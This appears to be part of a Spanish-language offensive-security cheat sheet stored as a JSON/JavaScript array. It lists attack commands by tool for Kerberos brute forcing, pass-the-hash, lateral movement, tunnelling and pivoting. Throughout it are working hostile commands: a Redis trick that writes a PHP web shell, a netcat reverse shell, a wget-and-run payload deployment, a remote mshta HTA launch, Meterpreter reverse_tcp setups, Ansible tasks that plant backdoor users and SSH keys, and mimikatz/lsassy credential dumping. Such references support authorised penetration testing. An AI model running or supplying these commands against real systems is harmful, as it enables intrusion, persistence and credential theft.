   {
    "cmd": "redis-cli -h IP ping",
    "desc": "Ping"
   },
   {
    "cmd": "redis-cli -h IP info",
    "desc": "Info del servidor"
   },
   {
    "cmd": "redis-cli -h IP config get dir",
    "desc": "Directorio"
   },
   {
    "cmd": "redis-cli -h IP CONFIG SET dir /var/www/html",
    "desc": "Cambiar dir"
   },
   {
    "cmd": "redis-cli -h IP CONFIG SET dbfilename shell.php",
    "desc": "Nombre de archivo"
   },
   {
    "cmd": "redis-cli -h IP SET shell '<?php system($_GET[\"c\"]); ?>'",
    "desc": "Escribir payload"
   },
   {
    "cmd": "redis-cli -h IP SAVE",
    "desc": "Guardar"
   },
   {
    "cmd": "redis-cli -h IP keys '*'",
    "desc": "Listar keys"
   },
   {
    "cmd": "redis-cli -h IP -a password",
    "desc": "Con password"
   },
   {
    "cmd": "redis-cli -h IP --raw get key",
    "desc": "Leer key"
   },
   {
    "cmd": "redis-cli -h IP EVAL 'return 1' 0",
    "desc": "Evaluar Lua"
   }
  ]
 },
 {
  "tool": "kerbrute",
  "desc": "Fuerza bruta de Kerberos (AS-REP, password spray)",
  "commands": [
   {
    "cmd": "kerbrute userenum -d dom.local users.txt --dc 192.168.1.10",
    "desc": "Enumerar usuarios"
   },
   {
    "cmd": "kerbrute passwordspray -d dom.local users.txt 'Password1' --dc IP",
    "desc": "Password spray"
   },
   {
    "cmd": "kerbrute bruteuser -d dom.local -p 'pass' admin --dc IP",
    "desc": "Brute user"
   },
   {
    "cmd": "kerbrute bruteuser -d dom.local -p 'pass' admin --dc IP -t 20",
    "desc": "20 hilos"
   },
   {
    "cmd": "kerbrute asreproast -d dom.local users.txt --dc IP",
    "desc": "AS-REP roast"
   },
   {
    "cmd": "kerbrute userenum -d dom.local users.txt --dc IP --delay 100",
    "desc": "Delay"
   },
   {
    "cmd": "kerbrute userenum -d dom.local users.txt --dc IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "kerbrute passwordspray -d dom.local users.txt pass --dc IP -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "kerbrute bruteuser -d dom.local -p pass admin --dc IP --output out.txt",
    "desc": "Output"
   },
   {
    "cmd": "kerbrute -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "winexe",
  "desc": "Ejecutar comandos remotamente en Windows",
  "commands": [
   {
    "cmd": "winexe -U user%pass //192.168.1.10 cmd.exe",
    "desc": "Shell remota"
   },
   {
    "cmd": "winexe -U user%pass //192.168.1.10 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "winexe -U 'dom\\\\user%pass' //192.168.1.10 cmd.exe",
    "desc": "Con dominio"
   },
   {
    "cmd": "winexe --uninstall -U user%pass //IP cmd.exe",
    "desc": "Sin instalar servicio"
   },
   {
    "cmd": "winexe -U user%pass --system //IP cmd.exe",
    "desc": "Como SYSTEM"
   },
   {
    "cmd": "winexe -U user%pass --interactive //IP cmd.exe",
    "desc": "Interactivo"
   },
   {
    "cmd": "winexe -U user%pass --reinstall //IP cmd.exe",
    "desc": "Reinstalar"
   },
   {
    "cmd": "winexe -U user%pass --port 445 //IP cmd.exe",
    "desc": "Puerto"
   },
   {
    "cmd": "winexe -U user%pass //IP 'net user'",
    "desc": "Net user"
   },
   {
    "cmd": "winexe -U user%pass //IP 'ipconfig /all'",
    "desc": "Ipconfig"
   },
   {
    "cmd": "winexe -U user%pass --verbose //IP cmd.exe",
    "desc": "Verbose"
   },
   {
    "cmd": "winexe -U user%pass --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "plink",
  "desc": "Cliente SSH de PuTTY (túneles)",
  "commands": [
   {
    "cmd": "plink user@IP -pw pass",
    "desc": "Conectar"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass",
    "desc": "SSH"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -L 8080:localhost:80",
    "desc": "Local forward"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -R 4444:localhost:4444",
    "desc": "Remote forward"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -D 1080",
    "desc": "SOCKS"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -N -L 3306:localhost:3306",
    "desc": "Silencioso"
   },
   {
    "cmd": "plink -ssh -i key.ppk user@IP",
    "desc": "Con clave PPK"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -batch",
    "desc": "Batch"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -v",
    "desc": "Verbose"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass 'comando'",
    "desc": "Comando"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -P 2222",
    "desc": "Puerto"
   },
   {
    "cmd": "plink -ssh -agent user@IP",
    "desc": "Agente"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -m commands.txt",
    "desc": "Script"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -C",
    "desc": "Compresión"
   },
   {
    "cmd": "plink -ssh user@IP -pw pass -X",
    "desc": "X11"
   }
  ]
 },
 {
  "tool": "sshpass",
  "desc": "Automatizar password de SSH",
  "commands": [
   {
    "cmd": "sshpass -p pass ssh user@IP",
    "desc": "Con password"
   },
   {
    "cmd": "sshpass -p pass ssh user@IP 'whoami'",
    "desc": "Comando"
   },
   {
    "cmd": "sshpass -f pass.txt ssh user@IP",
    "desc": "De archivo"
   },
   {
    "cmd": "sshpass -e ssh user@IP",
    "desc": "Variable SSHPASS"
   },
   {
    "cmd": "sshpass -p pass scp file user@IP:/tmp/",
    "desc": "scp"
   },
   {
    "cmd": "sshpass -p pass rsync -av dir/ user@IP:/dest/",
    "desc": "rsync"
   },
   {
    "cmd": "sshpass -p pass -P 'passphrase' ssh -i key user@IP",
    "desc": "Passphrase"
   },
   {
    "cmd": "sshpass -p pass ssh -o StrictHostKeyChecking=no user@IP",
    "desc": "Sin hostkey"
   },
   {
    "cmd": "sshpass -p pass ssh -p 2222 user@IP",
    "desc": "Puerto"
   },
   {
    "cmd": "sshpass -p pass sftp user@IP",
    "desc": "sftp"
   },
   {
    "cmd": "sshpass -p pass ssh user@IP -L 8080:localhost:80",
    "desc": "Forward"
   },
   {
    "cmd": "sshpass -p pass ssh -tt user@IP 'bash'",
    "desc": "TTY"
   }
  ]
 },
 {
  "tool": "pth-winexe",
  "desc": "Winexe con pass-the-hash",
  "commands": [
   {
    "cmd": "pth-winexe -U user%LM:NTLM //192.168.1.10 cmd.exe",
    "desc": "PtH shell"
   },
   {
    "cmd": "pth-winexe -U dom\\\\user%LM:NTLM //192.168.1.10 cmd.exe",
    "desc": "Con dominio"
   },
   {
    "cmd": "pth-winexe -U user%HASH --system //IP cmd.exe",
    "desc": "Como SYSTEM"
   },
   {
    "cmd": "pth-winexe -U user%HASH --uninstall //IP cmd.exe",
    "desc": "Sin servicio"
   },
   {
    "cmd": "pth-winexe -U user%HASH //IP 'whoami'",
    "desc": "Comando"
   },
   {
    "cmd": "pth-winexe -U user%HASH --port 445 //IP cmd.exe",
    "desc": "Puerto"
   },
   {
    "cmd": "pth-winexe -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "samba-net",
  "desc": "Comandos net de Samba (RPC shell)",
  "commands": [
   {
    "cmd": "net rpc user list -I 192.168.1.10 -U user%pass",
    "desc": "Usuarios RPC"
   },
   {
    "cmd": "net rpc group list -I 192.168.1.10 -U user%pass",
    "desc": "Grupos"
   },
   {
    "cmd": "net rpc share list -I 192.168.1.10 -U user%pass",
    "desc": "Shares"
   },
   {
    "cmd": "net rpc info -I 192.168.1.10 -U user%pass",
    "desc": "Info del DC"
   },
   {
    "cmd": "net rpc user info admin -I IP -U user%pass",
    "desc": "Info usuario"
   },
   {
    "cmd": "net rpc trustdom list -I IP -U user%pass",
    "desc": "Trusts"
   },
   {
    "cmd": "net rpc password user newpass -I IP -U user%pass",
    "desc": "Cambiar pass"
   },
   {
    "cmd": "net rpc getsid -I IP -U user%pass",
    "desc": "SID"
   },
   {
    "cmd": "net lookup -I IP",
    "desc": "Lookup"
   },
   {
    "cmd": "net view //192.168.1.10",
    "desc": "Ver shares"
   },
   {
    "cmd": "net use \\\\\\\\IP\\\\share",
    "desc": "Conectar"
   },
   {
    "cmd": "net time -I IP -U user%pass",
    "desc": "Hora del DC"
   }
  ]
 },
 {
  "tool": "wmiexec-ptk",
  "desc": "WMI exec con Pass-the-Ticket (impacket style)",
  "commands": [
   {
    "cmd": "python3 wmiexec.py -k -no-pass dom/user@IP",
    "desc": "PtT sin pass"
   },
   {
    "cmd": "python3 wmiexec.py -k dom/user@IP -dc-ip DC",
    "desc": "Kerberos"
   },
   {
    "cmd": "python3 wmiexec.py -hashes LM:NTLM user@IP",
    "desc": "PtH"
   },
   {
    "cmd": "python3 wmiexec.py user:pass@IP",
    "desc": "Normal"
   },
   {
    "cmd": "python3 wmiexec.py -debug user:pass@IP",
    "desc": "Debug"
   },
   {
    "cmd": "python3 wmiexec.py user:pass@IP -shell-type cmd",
    "desc": "Cmd"
   },
   {
    "cmd": "python3 wmiexec.py user:pass@IP -shell-type powershell",
    "desc": "PS"
   }
  ]
 },
 {
  "tool": "powershell-remoting",
  "desc": "Movimiento lateral con PowerShell Remoting",
  "commands": [
   {
    "cmd": "powershell -c 'Enter-PSSession -ComputerName IP -Credential (Get-Credential)'",
    "desc": "Sesión interactiva"
   },
   {
    "cmd": "powershell -c 'New-PSSession -ComputerName IP -Credential user'",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -ComputerName IP -ScriptBlock {whoami}'",
    "desc": "Comando"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -ComputerName IP -Credential dom\\\\user -ScriptBlock {hostname}'",
    "desc": "Con creds"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -ComputerName IP -FilePath script.ps1'",
    "desc": "De archivo"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -ComputerName IP -ArgumentList $args -ScriptBlock {...}'",
    "desc": "Con args"
   },
   {
    "cmd": "powershell -c 'Test-WSMan IP'",
    "desc": "Test WinRM"
   },
   {
    "cmd": "powershell -c 'Get-PSSession'",
    "desc": "Sesiones"
   },
   {
    "cmd": "powershell -c 'Remove-PSSession -Id 1'",
    "desc": "Cerrar sesión"
   },
   {
    "cmd": "powershell -c 'Enter-PSSession -Session $s'",
    "desc": "Por sesión"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -ComputerName IP -ScriptBlock {Start-Process cmd}'",
    "desc": "Proceso"
   },
   {
    "cmd": "powershell -c '$s = New-PSSession -ComputerName IP; Enter-PSSession $s'",
    "desc": "Encadenar"
   },
   {
    "cmd": "powershell -c 'Invoke-Command -Session $s -ScriptBlock {ipconfig}'",
    "desc": "En sesión"
   },
   {
    "cmd": "powershell -c 'Enable-PSRemoting -Force'",
    "desc": "Habilitar remoting"
   }
  ]
 },
 {
  "tool": "wmic-remoting",
  "desc": "Movimiento lateral vía WMI remoto",
  "commands": [
   {
    "cmd": "wmic /node:IP /user:dom\\\\user /password:pass process call create 'cmd.exe /c whoami'",
    "desc": "RCE remoto"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass os get caption",
    "desc": "OS remoto"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass service list brief",
    "desc": "Servicios"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass process list brief",
    "desc": "Procesos"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass qfe list brief",
    "desc": "Patches"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass share list",
    "desc": "Shares"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass startup list",
    "desc": "Startup"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass volume list",
    "desc": "Volúmenes"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass useraccount list",
    "desc": "Usuarios"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass process call create 'mshta http://IP/x.hta'",
    "desc": "HTA remoto"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass path win32_process call create 'powershell -enc ...'",
    "desc": "PS remoto"
   },
   {
    "cmd": "wmic /node:IP /user:user /password:pass nicconfig get ipaddress",
    "desc": "IPs"
   }
  ]
 },
 {
  "tool": "winrs",
  "desc": "Ejecutar comandos remotos (WinRS)",
  "commands": [
   {
    "cmd": "winrs -r:IP whoami",
    "desc": "Comando"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass whoami",
    "desc": "Con creds"
   },
   {
    "cmd": "winrs -r:IP -u:dom\\\\user -p:pass cmd",
    "desc": "Shell remota"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass -d:dom cmd",
    "desc": "Dominio"
   },
   {
    "cmd": "winrs -r:http://IP:5985 cmd",
    "desc": "HTTP"
   },
   {
    "cmd": "winrs -r:https://IP:5986 cmd",
    "desc": "HTTPS"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass 'powershell -enc ...'",
    "desc": "PS encoded"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass -unencrypted cmd",
    "desc": "Sin cifrar"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass -t:30 cmd",
    "desc": "Timeout"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass -ssl cmd",
    "desc": "SSL"
   },
   {
    "cmd": "winrs -? ",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "crackmapexec-ssh",
  "desc": "Movimiento lateral y validación vía SSH (CME)",
  "commands": [
   {
    "cmd": "crackmapexec ssh 192.168.1.0/24 -u user -p pass",
    "desc": "Validar SSH"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass -x 'id'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass --port 2222",
    "desc": "Puerto"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass -k",
    "desc": "Keys"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u root -p pass --timeout 5",
    "desc": "Timeout"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass -C 'cat /etc/passwd'",
    "desc": "Comando"
   },
   {
    "cmd": "crackmapexec ssh hosts.txt -u user -p pass --continue-on-success",
    "desc": "Continuar"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "ansible-lateral",
  "desc": "Movimiento lateral con Ansible",
  "commands": [
   {
    "cmd": "ansible all -i hosts -m ping",
    "desc": "Ping"
   },
   {
    "cmd": "ansible all -i hosts -m shell -a 'id'",
    "desc": "Comando"
   },
   {
    "cmd": "ansible all -i hosts -m copy -a 'src=/tmp/x dest=/tmp/x'",
    "desc": "Copiar"
   },
   {
    "cmd": "ansible all -i hosts -m fetch -a 'src=/etc/passwd dest=/tmp/'",
    "desc": "Fetch"
   },
   {
    "cmd": "ansible all -i hosts -m raw -a 'whoami'",
    "desc": "Raw"
   },
   {
    "cmd": "ansible all -i hosts -m user -a 'name=backdoor password=HASH'",
    "desc": "Crear user"
   },
   {
    "cmd": "ansible all -i hosts -m authorized_key -a 'user=root key=\"PUBKEY\"'",
    "desc": "SSH key"
   },
   {
    "cmd": "ansible all -i hosts -m apt -a 'name=netcat state=present'",
    "desc": "Instalar"
   },
   {
    "cmd": "ansible all -i hosts -m cron -a 'name=x minute=* job=\"/tmp/p\"'",
    "desc": "Cron"
   },
   {
    "cmd": "ansible all -i hosts -m service -a 'name=sshd state=restarted'",
    "desc": "Servicio"
   },
   {
    "cmd": "ansible-playbook -i hosts playbook.yml",
    "desc": "Playbook"
   },
   {
    "cmd": "ansible all -i hosts -m script -a '/tmp/enum.sh'",
    "desc": "Script"
   },
   {
    "cmd": "ansible all -i hosts -m setup",
    "desc": "Facts"
   },
   {
    "cmd": "ansible all -i hosts -m lineinfile -a 'path=/etc/hosts line=\"IP host\"'",
    "desc": "Editar"
   },
   {
    "cmd": "ansible all -i hosts -m find -a 'paths=/etc patterns=*.conf'",
    "desc": "Buscar"
   }
  ]
 },
 {
  "tool": "psexec-extra",
  "desc": "PsExec (variantes y alternativas)",
  "commands": [
   {
    "cmd": "psexec.py DOMAIN/user:pass@IP",
    "desc": "Shell"
   },
   {
    "cmd": "psexec.py DOMAIN/user:pass@IP -hashes LM:NT",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "psexec.py user:pass@IP -c /tmp/payload.exe",
    "desc": "Comando"
   },
   {
    "cmd": "psexec.py user:pass@IP -d",
    "desc": "Debug"
   },
   {
    "cmd": "psexec.py user:pass@IP -port 445",
    "desc": "Puerto"
   },
   {
    "cmd": "psexec.py -no-pass user@IP",
    "desc": "Sin pass"
   },
   {
    "cmd": "wmiexec.py DOMAIN/user:pass@IP",
    "desc": "WMI exec"
   },
   {
    "cmd": "atexec.py DOMAIN/user:pass@IP 'whoami'",
    "desc": "At exec"
   },
   {
    "cmd": "smbexec.py DOMAIN/user:pass@IP",
    "desc": "SMB exec"
   },
   {
    "cmd": "dcomexec.py DOMAIN/user:pass@IP",
    "desc": "DCOM exec"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/smb/psexec; set RHOSTS IP; set SMBDomain DOMAIN; set SMBUser user; set SMBPass pass; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "MSF psexec"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -M exec",
    "desc": "CME exec"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --exec-method smbexec -x whoami",
    "desc": "CME smbexec"
   },
   {
    "cmd": "impacket-psexec -target-ip IP DOMAIN/user:pass",
    "desc": "Target-ip"
   }
  ]
 },
 {
  "tool": "ssh-lateral",
  "desc": "Movimiento lateral con SSH (variantes)",
  "commands": [
   {
    "cmd": "ssh user@IP",
    "desc": "Login"
   },
   {
    "cmd": "ssh -i key user@IP",
    "desc": "Con clave"
   },
   {
    "cmd": "ssh -p 2222 user@IP",
    "desc": "Puerto"
   },
   {
    "cmd": "ssh -o StrictHostKeyChecking=no user@IP",
    "desc": "Sin hostkey"
   },
   {
    "cmd": "ssh -o UserKnownHostsFile=/dev/null user@IP",
    "desc": "Sin known hosts"
   },
   {
    "cmd": "ssh -J jumpuser@JUMP user@IP",
    "desc": "Jump host"
   },
   {
    "cmd": "ssh -D 1080 user@IP",
    "desc": "SOCKS dinámico"
   },
   {
    "cmd": "ssh -L 8080:target:80 user@IP",
    "desc": "Local fwd"
   },
   {
    "cmd": "ssh -R 4444:localhost:4444 user@IP",
    "desc": "Remote fwd"
   },
   {
    "cmd": "ssh user@IP 'command'",
    "desc": "Comando"
   },
   {
    "cmd": "ssh user@IP 'cat /etc/shadow'",
    "desc": "Leer"
   },
   {
    "cmd": "ssh-copy-id -i key.pub user@IP",
    "desc": "Copiar clave"
   },
   {
    "cmd": "ssh user@IP 'nohup nc -e /bin/bash IP 5555 &'",
    "desc": "Reverse"
   },
   {
    "cmd": "ssh -o BatchMode=yes user@IP",
    "desc": "Sin prompt"
   },
   {
    "cmd": "ssh user@IP 'wget http://IP/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p'",
    "desc": "Desplegar"
   }
  ]
 },
 {
  "tool": "winrm-lateral",
  "desc": "WinRM para movimiento lateral",
  "commands": [
   {
    "cmd": "evil-winrm -i IP -u user -p pass",
    "desc": "Shell"
   },
   {
    "cmd": "evil-winrm -i IP -u user -H NT_HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -s /tmp/scripts",
    "desc": "Scripts dir"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -e /tmp/exe",
    "desc": "Exe dir"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -P 5985",
    "desc": "Puerto"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -S",
    "desc": "SSL"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -l",
    "desc": "Log"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -c '/tmp/x.exe'",
    "desc": "Ejecutar exe"
   },
   {
    "cmd": "evil-winrm> upload /tmp/x.exe",
    "desc": "Upload"
   },
   {
    "cmd": "evil-winrm> download C:\\\\x.txt",
    "desc": "Download"
   },
   {
    "cmd": "evil-winrm> services",
    "desc": "Servicios"
   },
   {
    "cmd": "evil-winrm> menu",
    "desc": "Menú"
   },
   {
    "cmd": "evil-winrm> invoke-binary /tmp/winpeas.exe",
    "desc": "Invoke binary"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass 'whoami'",
    "desc": "Winrs"
   },
   {
    "cmd": "winrs -r:IP -u:user -p:pass 'cmd /c whoami'",
    "desc": "Winrs cmd"
   },
   {
    "cmd": "crackmapexec winrm IP -u user -p pass -x whoami",
    "desc": "CME winrm"
   }
  ]
 },
 {
  "tool": "kerberos-lateral",
  "desc": "Ataques Kerberos (pass-the-ticket, silver ticket)",
  "commands": [
   {
    "cmd": "klist",
    "desc": "Tickets"
   },
   {
    "cmd": "kinit user@DOMAIN.LOCAL",
    "desc": "Iniciar sesión"
   },
   {
    "cmd": "kinit -k -t user.keytab user@DOMAIN.LOCAL",
    "desc": "Con keytab"
   },
   {
    "cmd": "klist -e",
    "desc": "Enctypes"
   },
   {
    "cmd": "GetUserSPNs.py DOMAIN/user:pass -dc-ip IP",
    "desc": "SPNs"
   },
   {
    "cmd": "GetUserSPNs.py DOMAIN/user:pass -request -dc-ip IP",
    "desc": "Request TGS"
   },
   {
    "cmd": "GetUserSPNs.py -request-user user DOMAIN/user:pass -dc-ip IP",
    "desc": "Para user"
   },
   {
    "cmd": "GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip IP",
    "desc": "ASREPRoast"
   },
   {
    "cmd": "GetNPUsers.py DOMAIN/user:pass -request -dc-ip IP",
    "desc": "Request ASREP"
   },
   {
    "cmd": "getTGT.py DOMAIN/user:pass -dc-ip IP",
    "desc": "Obtener TGT"
   },
   {
    "cmd": "getST.py DOMAIN/user:pass -spn 'cifs/IP' -dc-ip IP",
    "desc": "ST"
   },
   {
    "cmd": "getST.py -spn 'http/IP' -impersonate admin DOMAIN/user:pass -dc-ip IP",
    "desc": "Impersonar"
   },
   {
    "cmd": "ticketer.py -nthash NT_HASH -domain-sid SID -domain DOMAIN.local user",
    "desc": "Crear ticket"
   },
   {
    "cmd": "export KRB5CCNAME=/tmp/ticket.ccache",
    "desc": "Exportar"
   },
   {
    "cmd": "psexec.py -k -no-pass DOMAIN/user@IP",
    "desc": "Usar ticket"
   },
   {
    "cmd": "rubeus.exe dump",
    "desc": "Rubeus dump"
   },
   {
    "cmd": "rubeus.exe kerberoast",
    "desc": "Rubeus roast"
   },
   {
    "cmd": "rubeus.exe asreproast",
    "desc": "Rubeus asrep"
   }
  ]
 },
 {
  "tool": "rdp-lateral",
  "desc": "RDP para movimiento lateral",
  "commands": [
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP",
    "desc": "Conexión"
   },
   {
    "cmd": "xfreerdp /u:user /pth:NT_HASH /v:IP",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /size:1280x800",
    "desc": "Tamaño"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /cert-ignore",
    "desc": "Ignorar cert"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /drive:/tmp",
    "desc": "Redirigir drive"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /clipboard",
    "desc": "Portapapeles"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /dynamic-resolution",
    "desc": "Dinámico"
   },
   {
    "cmd": "xfreerdp /u:user /p:pass /v:IP /f",
    "desc": "Fullscreen"
   },
   {
    "cmd": "rdesktop -u user -p pass IP",
    "desc": "Rdesktop"
   },
   {
    "cmd": "rdesktop -u user -p pass -g 1280x800 IP",
    "desc": "Con tamaño"
   },
   {
    "cmd": "crackmapexec rdp IP -u user -p pass",
    "desc": "Check RDP"
   },
   {
    "cmd": "nmap --script=rdp-ntlm-info -p3389 IP",
    "desc": "NTLM info"
   },
   {
    "cmd": "remmina",
    "desc": "GUI remmina"
   },
   {
    "cmd": "mstsc /v:IP",
    "desc": "Windows mstsc"
   },
   {
    "cmd": "rdesktop -u user -p pass -r disk:tmp=/tmp IP",
    "desc": "Disk redirect"
   }
  ]
 },
 {
  "tool": "tunnels-tools",
  "desc": "Túneles y pivoting",
  "commands": [
   {
    "cmd": "chisel server -p 8080 --reverse",
    "desc": "Chisel server"
   },
   {
    "cmd": "chisel client IP:8080 R:4444:localhost:22",
    "desc": "Chisel client"
   },
   {
    "cmd": "chisel client IP:8080 L:9000:target:80",
    "desc": "Local fwd"
   },
   {
    "cmd": "ssh -D 1080 user@IP",
    "desc": "SOCKS dinámico"
   },
   {
    "cmd": "ssh -L 8080:target:80 user@IP",
    "desc": "Local fwd"
   },
   {
    "cmd": "ssh -R 4444:localhost:4444 user@IP",
    "desc": "Remote fwd"
   },
   {
    "cmd": "ssh -o ProxyCommand='nc -X connect -x proxy:8080 %h %p' user@target",
    "desc": "ProxyCommand"
   },
   {
    "cmd": "socat TCP-LISTEN:8080,fork TCP:target:80",
    "desc": "Socat"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
    "desc": "Socat bash"
   },
   {
    "cmd": "gost -L socks5://:1080",
    "desc": "Gost socks"
   },
   {
    "cmd": "gost -L tcp://:8080/target:80",
    "desc": "Gost tcp"
   },
   {
    "cmd": "proxychains nmap -sT -Pn target -p 80,443",
    "desc": "Proxychains"
   },
   {
    "cmd": "proxychains4 curl http://target/",
    "desc": "PC4 curl"
   },
   {
    "cmd": "meterpreter> portfwd add -L 127.0.0.1 -l 8080 -p 80 -r target",
    "desc": "Portfwd"
   },
   {
    "cmd": "meterpreter> route add 10.0.0.0/24 1",
    "desc": "Ruta"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j'",
    "desc": "MSF socks"
   }
  ]
 },
 {
  "tool": "dcom-lateral",
  "desc": "Movimiento lateral vía DCOM",
  "commands": [
   {
    "cmd": "impacket-dcomexec DOMAIN/user:pass@IP",
    "desc": "DCOM exec"
   },
   {
    "cmd": "impacket-dcomexec -object MMC20 DOMAIN/user:pass@IP 'whoami'",
    "desc": "MMC20"
   },
   {
    "cmd": "impacket-dcomexec -object ShellWindows DOMAIN/user:pass@IP 'cmd /c whoami'",
    "desc": "ShellWindows"
   },
   {
    "cmd": "impacket-dcomexec -hashes LM:NT DOMAIN/user@IP",
    "desc": "PTH"
   },
   {
    "cmd": "impacket-dcomexec -no-pass user@IP",
    "desc": "Sin pass"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/local/dcom_xpcmdshell; set SESSION 1; run'",
    "desc": "MSF dcom"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/runas_dcom; set SESSION 1; set CMD whoami; run'",
    "desc": "RunAs dcom"
   },
   {
    "cmd": "meterpreter> run getgui",
    "desc": "GUI"
   },
   {
    "cmd": "wmic /node:IP /user:DOMAIN\\\\user /password:pass process call create 'cmd.exe /c whoami'",
    "desc": "WMIC node"
   },
   {
    "cmd": "psexec.py DOMAIN/user:pass@IP -port 445",
    "desc": "PsExec alt"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -M dcom",
    "desc": "CME dcom"
   }
  ]
 },
 {
  "tool": "lateral-automation",
  "desc": "Automatización de movimiento lateral",
  "commands": [
   {
    "cmd": "crackmapexec smb 192.168.1.0/24 -u user -p pass",
    "desc": "CME net"
   },
   {
    "cmd": "crackmapexec smb IP -u users.txt -p pass",
    "desc": "Usuarios"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p passes.txt",
    "desc": "Passwords"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --shares",
    "desc": "Shares"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --sessions",
    "desc": "Sesiones"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --disks",
    "desc": "Discos"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -x whoami",
    "desc": "Exec"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -M mimikatz",
    "desc": "Mimikatz"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -M lsassy",
    "desc": "Lsassy"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass -M rdp",
    "desc": "RDP check"
   },
   {
    "cmd": "nxc smb IP -u user -p pass -M spider_plus --folder Documents",
    "desc": "Spider"
   },
   {
    "cmd": "for ip in $(cat hosts.txt); do psexec.py user:pass@$ip 'whoami'; done",
    "desc": "Loop psexec"
   },
   {
    "cmd": "while read ip; do evil-winrm -i $ip -u user -p pass -c 'whoami'; done < hosts.txt",
    "desc": "Loop winrm"
   },
   {
    "cmd": "ansible all -i hosts -m win_shell -a 'whoami'",
    "desc": "Ansible win"
   },
   {
    "cmd": "ansible all -i hosts -m raw -a 'whoami'",
    "desc": "Ansible raw"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; run'",
    "desc": "MS17-010 scan"
   }
  ]
 }
];
